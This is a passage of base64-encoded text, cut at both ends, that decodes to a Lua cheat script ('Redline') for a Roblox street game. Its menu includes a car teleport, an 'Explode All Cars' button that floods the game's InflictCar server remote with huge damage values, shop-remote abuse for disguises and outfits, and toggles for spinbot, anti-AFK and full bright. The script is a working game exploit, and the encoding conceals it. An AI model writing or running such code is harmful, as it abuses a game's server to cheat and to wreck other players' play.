cy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXIgPSBQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgaHJwID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJIdW1hbm9pZCIpCiAgICAgICAgaWYgbm90IGhycCBvciBub3QgaHVtIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBjYXIgPSBHZXROZWFyZXN0Q2FyKGhycCkKCiAgICAgICAgaWYgbm90IGNhciB0aGVuCiAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICBpbmZvID0gIkNvdWxkbid0IEZpbmQgQW4gQXZhaWxhYmxlIENhciEiLAogICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBzZWF0ID0gY2FyOkZpbmRGaXJzdENoaWxkKCJEcml2ZVNlYXQiKQogICAgICAgIGlmIG5vdCBzZWF0IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBzZWF0OlNpdChodW0pCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBodW0uU2l0ID0gZmFsc2UKICAgICAgICBodW0uSnVtcCA9IHRydWUKCiAgICAgICAgY2FyOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKAogICAgICAgICAgICBocnAuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCAwLCAtNikKICAgICAgICApCgogICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgaW5mbyA9ICJDYXIgRGVsaXZlcmVkISIsCiAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgIH0pCiAgICBlbmQKfSkKLS0gZW5kIGJyaW5nIGNhcgoKRXh0cmFTZWN0aW9uOmJ1dHRvbih7CiAgICBuYW1lID0gIkV4cGxvZGUgQWxsIENhcnMgLSBIb2xkIEd1biIsCiAgICBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBMb2NhbFBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCiAgICAgICAgbG9jYWwgZ3VuID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiVG9vbCIpCgogICAgICAgIGlmIG5vdCBndW4gdGhlbgogICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9ICJIb2xkIGEgZ3VuIGZpcnN0ISIsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDQKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGNpdkNhcnMgPSB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkNpdkNhcnMiKQogICAgICAgIGlmIG5vdCBjaXZDYXJzIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgIGluZm8gPSAiRXhwbG9kaW5nIGFsbCBWZWhpY2xlcy4uLiIsCiAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgIH0pCgogICAgICAgIGxvY2FsIGNvdW50ID0gMAogICAgICAgIGZvciBfLCBjYXIgaW4gY2l2Q2FyczpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgIGlmIGNhcjpJc0EoIk1vZGVsIikgdGhlbgogICAgICAgICAgICAgICAgY291bnQgKz0gMQogICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgcGFydCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGNhcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJCYXNlUGFydCIpIG9yIGNhci5QcmltYXJ5UGFydAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc3VjY2VzcyBvciBub3QgcGFydCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAxLCA0MDAwIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLkluZmxpY3RDYXI6SW52b2tlU2VydmVyKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGd1biwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA5ZTUwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2sud2FpdCg2KQogICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgaW5mbyA9IGNvdW50IC4uICIgVmVoaWNsZXMgRXhwbG9kZWQhIiwKICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgfSkKICAgIGVuZAp9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEV4dHJhU2VjdGlvbjpidXR0b24oe25hbWUgPSAiSGlkZSBJZGVudGl0eS4iLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIFBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgbG9jYWwgQmFja3BhY2sgPSBQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCiAgICAgICAgICAgICAgICBsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQoKICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiU2hvcFJlbW90ZSIpOkludm9rZVNlcnZlcigiU2hpZXN0eSIpCiAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlNob3BSZW1vdGUiKTpJbnZva2VTZXJ2ZXIoIkJsYWNrR2xvdmVzIikKCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjEpCgogICAgICAgICAgICAgICAgbG9jYWwgU2hpZXN0eSA9IEJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJTaGllc3R5Iikgb3IgUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiU2hpZXN0eSIpCiAgICAgICAgICAgICAgICBpZiBTaGllc3R5IHRoZW4KICAgICAgICAgICAgICAgIFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKFNoaWVzdHkpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjEpCgogICAgICAgICAgICAgICAgbG9jYWwgUmVtb3RlID0gU2hpZXN0eTpGaW5kRmlyc3RDaGlsZCgiUmVtb3RlRXZlbnQiKQogICAgICAgICAgICAgICAgaWYgUmVtb3RlIHRoZW4KICAgICAgICAgICAgICAgIFJlbW90ZTpGaXJlU2VydmVyKCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjEpCiAgICAgICAgICAgICAgICAgUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpVbmVxdWlwVG9vbHMoKQogICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjEpCiAgICAgICAgICAgICAgICAgbG9jYWwgR2xvdmVzID0gQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkJsYWNrR2xvdmVzIikgb3IgUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQmxhY2tHbG92ZXMiKQogICAgICAgICAgICAgICAgIGlmIEdsb3ZlcyB0aGVuCiAgICAgICAgICAgICAgICAgUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woR2xvdmVzKQogICAgICAgICAgICAgICAgIHRhc2sud2FpdCguMSkKCiAgICAgICAgICAgICAgICAgR2xvdmVzOkFjdGl2YXRlKCkKCiAgICAgICAgICAgICAgICAgdGFzay53YWl0KC4xKQogICAgICAgICAgICAgICAgIFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6VW5lcXVpcFRvb2xzKCkKICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICBlbmR9KSAgCiAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBFeHRyYVNlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQXV0byBQYXNzIiwgZmxhZyA9ICJhdXRvcGFzcyIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguYXV0b3Bhc3MgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEV4dHJhU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJGdWxsIEJyaWdodCIsIGZsYWcgPSAiRnVsbGJyaWdodCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuV29ybGRWaXN1YWxzLkZ1bGxicmlnaHQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkgICAKCiAgICAgICAgICAgICAgICBFeHRyYVNlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQW50aSBBRksiLCBmbGFnID0gImFudGlhZmsiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LmFudGlhZmsgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkgICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgIEV4dHJhU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJTcGluYm90IiwgZmxhZyA9ICJzcGluYm90dGVyIiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5zcGluYm90dGVyID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBFeHRyYVNlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiU2V0IEZvdiIsIGZsYWcgPSAidGIzX2ZvdiIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbngudGIzX2ZvdiA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEV4dHJhU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiU3BpbmJvdCBTcGVlZCIsIGZsYWcgPSAic3BpbmJvdHRlcnNwZWVkIiwgbWluID0gNSwgbWF4ID0gNDUsIGRlZmF1bHQgPSAyMCwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5zcGluYm90dGVyc3BlZWQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICBFeHRyYVNlY3Rpb246c2xpZGVyKHtuYW1lID0gIkZvdiBWYWx1ZSIsIGZsYWcgPSAiRmllbGRPZlZpZXdWYWx1ZSIsIG1pbiA9IDgwLCBtYXggPSAxMjAsIGRlZmF1bHQgPSA5NSwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5GaWVsZE9mVmlld1ZhbHVlID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pIAogICAgICAgICAgICAgICAgCkV4dHJhU2VjdGlvbjpidXR0b24oe25hbWUgPSAiUmVzZXQgQ2xvdGhpbmcuIixjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBhcmdzID0geyJSZXNldCBEYXRhIn0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJDbG90aFNob3BSZW1vdGUiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGVuZAp9KQoKRXh0cmFTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJTcGlkZXJtYW4gT3V0Zml0IixjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBSZW1vdGUgPSBnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQ2xvdGhTaG9wUmVtb3RlIikKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2VuZChhLGIsYykKICAgICAgICAgICAgUmVtb3RlOkZpcmVTZXJ2ZXIoYSxiLGMpCiAgICAgICAgZW5kCgogICAgICAgIHNlbmQoIlJlc2V0IERhdGEiKQogICAgICAgIHNlbmQoIkJ1eSIsIkhhdHMiLCJSZWRDbGVlenkiKQogICAgICAgIHNlbmQoIkJ1eSIsIkdsYXNzZXMiLCJSZWRTaGFkZXMiKQogICAgICAgIHNlbmQoIkJ1eSIsIlNoaXJ0cyIsIlNwaWRlcm1hbiIpCiAgICAgICAgc2VuZCgiQnV5IiwiUGFudHMiLCJTcGlkZXJtYW4iKQogICAgICAgIHNlbmQoIkJ1eSIsIlNoaWVzdHlzIiwiUmVkU2hpZXN0eSIpCgogICAgICAgIHNlbmQoIldlYXIiLCJIYXRzIiwiUmVkQ2xlZXp5IikKICAgICAgICBzZW5kKCJXZWFyIiwiR2xhc3NlcyIsIlJlZFNoYWRlcyIpCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaXJ0cyIsIlNwaWRlcm1hbiIpCiAgICAgICAgc2VuZCgiV2VhciIsIlBhbnRzIiwiU3BpZGVybWFuIikKICAgICAgICBzZW5kKCJXZWFyIiwiU2hpZXN0eXMiLCJSZWRTaGllc3R5IikKICAgIGVuZAp9KQoKRXh0cmFTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJEcmlwIEZpdCIsY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgUmVtb3RlID0gZ2FtZS5SZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIkNsb3RoU2hvcFJlbW90ZSIpCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIHNlbmQoYSxiLGMpCiAgICAgICAgICAgIFJlbW90ZTpGaXJlU2VydmVyKGEsYixjKQogICAgICAgIGVuZAoKICAgICAgICBzZW5kKCJSZXNldCBEYXRhIikKICAgICAgICBzZW5kKCJCdXkiLCJTaGllc3R5cyIsIlNoaWVzdHkiKQogICAgICAgIHNlbmQoIkJ1eSIsIkhhdHMiLCJCbHVIYXQiKSAgIAogICAgICAgIHNlbmQoIkJ1eSIsIkdsYXNzZXMiLCJCbGFja1NoYWRlcyIpCiAgICAgICAgc2VuZCgiQnV5IiwiU2hpcnRzIiwiV2hpdGUgVGF0dGVkIFQgc2hpcnQiKQogICAgICAgIHNlbmQoIkJ1eSIsIlNoaWVzdHlzIiwiU2hpZXN0eSIpCiAgICAgICAgc2VuZCgiQnV5IiwiUGFudHMiLCJXaGl0ZSBBRjEgQkplYW5zIikKCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaWVzdHlzIiwiU2hpZXN0eSIpCiAgICAgICAgc2VuZCgiV2VhciIsIkhhdHMiLCJCbHVIYXQiKSAgIAogICAgICAgIHNlbmQoIldlYXIiLCJHbGFzc2VzIiwiQmxhY2tTaGFkZXMiKQogICAgICAgIHNlbmQoIldlYXIiLCJTaGlydHMiLCJXaGl0ZSBUYXR0ZWQgVCBzaGlydCIpCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaWVzdHlzIiwiU2hpZXN0eSIpCiAgICAgICAgc2VuZCgiV2VhciIsIlBhbnRzIiwiV2hpdGUgQUYxIEJKZWFucyIpICAgICAgICAKICAgIGVuZAp9KQoKRXh0cmFTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJCbGFja2VkIE91dCBGaXQiLGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFJlbW90ZSA9IGdhbWUuUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJDbG90aFNob3BSZW1vdGUiKQoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBzZW5kKGEsYixjKQogICAgICAgICAgICBSZW1vdGU6RmlyZVNlcnZlcihhLGIsYykKICAgICAgICBlbmQKCiAgICAgICAgc2VuZCgiUmVzZXQgRGF0YSIpCiAgICAgICAgc2VuZCgiQnV5IiwiSGF0cyIsIkVzc2VudGlhbCBIb29kIikKICAgICAgICBzZW5kKCJCdXkiLCJTaGllc3R5cyIsIlNoaWVzdHkiKQogICAgICAgIHNlbmQoIkJ1eSIsIkdsYXNzZXMiLCJCbGFja1NoYWRlcyIpCiAgICAgICAgc2VuZCgiQnV5IiwiU2hpcnRzIiwiQmFsbWFpbiBIb29kaWUiKQogICAgICAgIHNlbmQoIkJ1eSIsIlBhbnRzIiwiQmxhY2sgUGFsbUFuZ2VscyIpCiAgICAgICAKICAgICAgICBzZW5kKCJXZWFyIiwiSGF0cyIsIkVzc2VudGlhbCBIb29kIikKICAgICAgICBzZW5kKCJXZWFyIiwiU2hpZXN0eXMiLCJTaGllc3R5IikKICAgICAgICBzZW5kKCJXZWFyIiwiR2xhc3NlcyIsIkJsYWNrU2hhZGVzIikKICAgICAgICBzZW5kKCJXZWFyIiwiU2hpcnRzIiwiQmFsbWFpbiBIb29kaWUiKQogICAgICAgIHNlbmQoIldlYXIiLCJQYW50cyIsIkJsYWNrIFBhbG1BbmdlbHMiKQogICAgZW5kCn0pCgpFeHRyYVNlY3Rpb246YnV0dG9uKHtuYW1lID0gIkdob3N0IEZhY2UgRml0IixjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBSZW1vdGUgPSBnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQ2xvdGhTaG9wUmVtb3RlIikKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2VuZChhLGIsYykKICAgICAgICAgICAgUmVtb3RlOkZpcmVTZXJ2ZXIoYSxiLGMpCiAgICAgICAgZW5kCgogICAgICAgIHNlbmQoIlJlc2V0IERhdGEiKQogICAgICAgIHNlbmQoIkJ1eSIsIk1hc2tzIiwiR2hvc3RGYWNlIikKICAgICAgICBzZW5kKCJCdXkiLCJTaGllc3R5cyIsIlNoaWVzdHkiKQogICAgICAgIHNlbmQoIkJ1eSIsIlNoaXJ0cyIsIkJsYWNrIFBhbG1BbmdlbCBKYWNrZXQiKQogICAgICAgIHNlbmQoIkJ1eSIsIlBhbnRzIiwiR3JleSBKZWFuIFcgRGlvciBSdW5uZXJzIikKCiAgICAgICAgc2VuZCgiV2VhciIsIk1hc2tzIiwiR2hvc3RGYWNlIikKICAgICAgICBzZW5kKCJXZWFyIiwiU2hpZXN0eXMiLCJTaGllc3R5IikKICAgICAgICBzZW5kKCJXZWFyIiwiU2hpcnRzIiwiQmxhY2sgUGFsbUFuZ2VsIEphY2tldCIpCiAgICAgICAgc2VuZCgiV2VhciIsIlBhbnRzIiwiR3JleSBKZWFuIFcgRGlvciBSdW5uZXJzIikgICAgICAgIAogICAgZW5kCn0pCgpFeHRyYVNlY3Rpb246YnV0dG9uKHtuYW1lID0gIk1pY2hlYWwgTXllcnMgRml0IixjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBSZW1vdGUgPSBnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQ2xvdGhTaG9wUmVtb3RlIikKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2VuZChhLGIsYykKICAgICAgICAgICAgUmVtb3RlOkZpcmVTZXJ2ZXIoYSxiLGMpCiAgICAgICAgZW5kCgogICAgICAgIHNlbmQoIlJlc2V0IERhdGEiKQogICAgICAgIHNlbmQoIkJ1eSIsIk1hc2tzIiwiTXllcnNNYXNrIikKICAgICAgICBzZW5kKCJCdXkiLCJTaGllc3R5cyIsIlNoaWVzdHkiKQogICAgICAgIHNlbmQoIkJ1eSIsIlNoaXJ0cyIsIlRhbiBNZWNoYW5pYyBYIikKICAgICAgICBzZW5kKCJCdXkiLCJQYW50cyIsIlRhbiBNYWNoYW5pYyBQYW50cyBCbGFjayBBRjEiKQogICAgICAgIAogICAgICAgIHNlbmQoIldlYXIiLCJNYXNrcyIsIk15ZXJzTWFzayIpCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaWVzdHlzIiwiU2hpZXN0eSIpCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaXJ0cyIsIlRhbiBNZWNoYW5pYyBYIikKICAgICAgICBzZW5kKCJXZWFyIiwiUGFudHMiLCJUYW4gTWFjaGFuaWMgUGFudHMgQmxhY2sgQUYxIikgICAgICAgICAgIAogICAgZW5kCn0pCgpFeHRyYVNlY3Rpb246YnV0dG9uKHtuYW1lID0gIlBpbmsgRml0IixjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBSZW1vdGUgPSBnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQ2xvdGhTaG9wUmVtb3RlIikKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2VuZChhLGIsYykKICAgICAgICAgICAgUmVtb3RlOkZpcmVTZXJ2ZXIoYSxiLGMpCiAgICAgICAgZW5kCgogICAgICAgIHNlbmQoIlJlc2V0IERhdGEiKQogICAgICAgIHNlbmQoIkJ1eSIsIkhhdHMiLCJQaW5rQ2xlZXp5IikgCiAgICAgICAgc2VuZCgiQnV5IiwiU2hpZXN0eXMiLCJQaW5rU2hpZXN0eSIpICAgCiAgICAgICAgc2VuZCgiQnV5IiwiR2xhc3NlcyIsIlBpbmtTaGFkZXMiKSAgICAgICAKICAgICAgICBzZW5kKCJCdXkiLCJTaGlydHMiLCJQaW5rIEJhcGUiKQogICAgICAgIHNlbmQoIkJ1eSIsIlBhbnRzIiwiUGluayBCYXBlc3RhIEplYW5zIikKCiAgICAgICAgc2VuZCgiV2VhciIsIkhhdHMiLCJQaW5rQ2xlZXp5IikgCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaWVzdHlzIiwiUGlua1NoaWVzdHkiKSAgIAogICAgICAgIHNlbmQoIldlYXIiLCJHbGFzc2VzIiwiUGlua1NoYWRlcyIpICAgICAgIAogICAgICAgIHNlbmQoIldlYXIiLCJTaGlydHMiLCJQaW5rIEJhcGUiKQogICAgICAgIHNlbmQoIldlYXIiLCJQYW50cyIsIlBpbmsgQmFwZXN0YSBKZWFucyIpICAgICAgICAKICAgIGVuZAp9KQoKRXh0cmFTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJCbHVlIEdhbmcgRml0IixjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBSZW1vdGUgPSBnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQ2xvdGhTaG9wUmVtb3RlIikKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2VuZChhLGIsYykKICAgICAgICAgICAgUmVtb3RlOkZpcmVTZXJ2ZXIoYSxiLGMpCiAgICAgICAgZW5kCgogICAgICAgIAogICAgICAgIHNlbmQoIlJlc2V0IERhdGEiKQogICAgICAgIHNlbmQoIkJ1eSIsIkhhdHMiLCJCbHVDbGVlenkiKQogICAgICAgIHNlbmQoIkJ1eSIsIlNoaWVzdHlzIiwiQmx1U2hpZXN0eSIpCiAgICAgICAgc2VuZCgiQnV5IiwiR2xhc3NlcyIsIkJsdVNoYWRlcyIpCiAgICAgICAgc2VuZCgiQnV5IiwiU2hpcnRzIiwiQmx1ZVRlY2giKQogICAgICAgIHNlbmQoIkJ1eSIsIlBhbnRzIiwiQW1pcmkgQmx1ZSBKZWFucyIpCgogICAgICAgIAogICAgICAgIHNlbmQoIldlYXIiLCJIYXRzIiwiQmx1Q2xlZXp5IikKICAgICAgICBzZW5kKCJXZWFyIiwiU2hpZXN0eXMiLCJCbHVTaGllc3R5IikKICAgICAgICBzZW5kKCJXZWFyIiwiR2xhc3NlcyIsIkJsdVNoYWRlcyIpCiAgICAgICAgc2VuZCgiV2VhciIsIlNoaXJ0cyIsIkJsdWVUZWNoIikKICAgICAgICBzZW5kKCJXZWFyIiwiUGFudHMiLCJBbWlyaSBCbHVlIEplYW5zIikKICAgIGVuZAp9KQogICAgICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgIGxvY2FsIFVJU2VjdGlvbiA9IExvY2FsUGxheWVyQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiVG9nZ2xlIEdVSSIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMC4yMjAsIGljb24gPSBHZXRJbWFnZSgiU2V0dGluZ3MucG5nIil9KQoKICAgICAgICAgICAgICAgIGxvY2FsIF9VSU5hbWVzLCBCbGFja2xpc3RlZE5hbWVzID0geydBVE0gR1VJJ30sIHsiRGVhZCIsICJTZXR0aW5nczEiLCAiQ29udHJvbHMiLCAiRmlyc3RTaG9wR1VJIiwgIkNvbG9yV2hlZWwiLCAiQ29wU2lyZW5zIiwgIlRFU1QgTE9DS1BJQ0siLCAiQkFDS1BBQ0sgVUkiLCAiR2FyYWdlIEdVSSBbT0xEXSIsICJUUlVOSyBTVE9SQUdFIiwgIlRoYVNob3AyIiwgIldBVENIIEdVSSIsICJOWVBEIENhcnMiLCAiQ09OU1RSVUNUSU9OIExFVkVMIiwgIlJvYlBsYXllclVJIiwgIkJyb254IExPQ0tFUiIsICdNb2JpbGVCZWFtJywgJ1NldHRpbmdzJywgJ0ZsYXNoJywgJ0VudGVyJ30KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBMb2NhbFBsYXllci5QbGF5ZXJHdWk6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlOklzQSgiU2NyZWVuR3VpIikgYW5kIG5vdCBWYWx1ZS5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFibGUuZmluZChCbGFja2xpc3RlZE5hbWVzLCBWYWx1ZS5OYW1lKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoX1VJTmFtZXMsIFZhbHVlLk5hbWUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgbG9jYWwgX1VJX0VuYWJsZWRUb2dnbGU7CgogICAgICAgICAgICAgICAgVUlTZWN0aW9uOmRyb3Bkb3duKHtuYW1lID0gIlNlbGVjdGVkIFVJIiwgZmxhZyA9ICJTZWxlY3RlZFVJX1RCMyIsIHdp